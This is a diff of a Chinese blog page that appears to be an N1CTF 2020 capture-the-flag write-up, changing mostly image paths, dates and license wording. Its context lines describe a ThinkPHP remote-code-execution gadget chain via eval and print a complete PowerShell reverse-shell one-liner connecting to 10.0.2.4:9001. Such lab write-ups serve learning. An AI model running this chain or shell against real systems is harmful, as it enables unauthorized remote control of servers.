@@ -496,7 +496,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>以上部分跟tp5的rce思路完全一致。只不过题目设置了disable_function,以及禁用了一些单参数函数。导致大部分payload都不可行。</p>
 <p>那么比较重要的就是找gadget了。<br>我们可以控制filter,然后进行任意方法的单参数rce.不过由于for循环循环调用<code>$value</code>.所以可以搭配gadget进行rce.<br>这里可以找恶意函数找到eval<br><code>thinkphp\library\think\view\driver\Php.php</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($content, $data = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($data[<span class="string">'content'</span>])) &#123;</span><br><span class="line">        $__content__ = $content;</span><br><span class="line">        extract($data, EXTR_OVERWRITE);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'?&gt;'</span> . $__content__);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        extract($data, EXTR_OVERWRITE);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'?&gt;'</span> . $content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>因为这里的直接调用会报错,所以看到SuperGuesser的wp里提到了设置set_error_handler 为任意其他函数来避免tp的默认错误处理。此处是<code>implode</code>.那么就可以直接继续了。<br>关于filter的调用。<br><img src="/2020/10/19/N1CTF2020/0.PNG" class="lazyload" data-srcset="N1CTF2020/0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>就是这四次调用</p>
+<p>因为这里的直接调用会报错,所以看到SuperGuesser的wp里提到了设置set_error_handler 为任意其他函数来避免tp的默认错误处理。此处是<code>implode</code>.那么就可以直接继续了。<br>关于filter的调用。<br><img src="/2020/10/19/N1CTF2020/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>就是这四次调用</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.set_error_handler &quot;implode&quot;</span><br><span class="line">2.self::path  base64-payload </span><br><span class="line">3.base64_decode  base64-payload </span><br><span class="line">4.\think\view\driver\Php::Display payload</span><br></pre></td></tr></table></figure>
 
 <p>payload</p>
@@ -511,7 +511,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>这里用到一个小技巧：powershell命令行下可以直接用<code>`t</code> 来表示字符串中的<code>\t</code>。</p>
 <p>然后开始准备用的是nishang的反弹shell脚本。结果没反应,感觉是被防火墙拦了。所以就换了个简单的<br>服务器上的byc.ps1</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">"10.0.2.4"</span>,<span class="number">9001</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">"PS "</span> + (pwd).Path + <span class="string">"&gt; "</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>
-<p>最后发送即可getshell<br><img src="/2020/10/19/N1CTF2020/1.PNG" class="lazyload" data-srcset="N1CTF2020/1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>最后发送即可getshell<br><img src="/2020/10/19/N1CTF2020/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>flag在userA 桌面<br><code>n1ctf{I&#39;m_a_little_fish,_swimming_in_the_ocean}</code></p>
 <p>后面拿域控的思路就没有了…</p>
 <h2 id="Docker-Manager"><a href="#Docker-Manager" class="headerlink" title="Docker_Manager"></a>Docker_Manager</h2><p>BUU上面又复现了两题。zabbix_fun直接拿exp打的。Docker_Manager可以记录下</p>
@@ -551,11 +551,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
                 <p>本文永久链接是：<a href=https://www.bycsec.top/2020/10/19/N1CTF2020/>https://www.bycsec.top/2020/10/19/N1CTF2020/</a></p>
               
             
-              
-                <p>欢迎打赏！ 您的支持将是我创作的重要动力</p>
-
-              
-            
           </blockquote>
         </div>
       
@@ -578,10 +573,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-23T19:43:54+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-18T13:09:36+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Oct 23, 2020</p>
+    <p>更新于：Feb 18, 2021</p>
   </a>
 </div>
 
@@ -746,7 +741,7 @@ fastjsonexp利用不必多说，主要是学习下原理。以下都在jdk1.8调
       
     
       
-        <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
 </div>
       
     
@@ -760,7 +755,7 @@ fastjsonexp利用不必多说，主要是学习下原理。以下都在jdk1.8调
       
         本站使用
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作为主题
+        作為主題
       
     
       
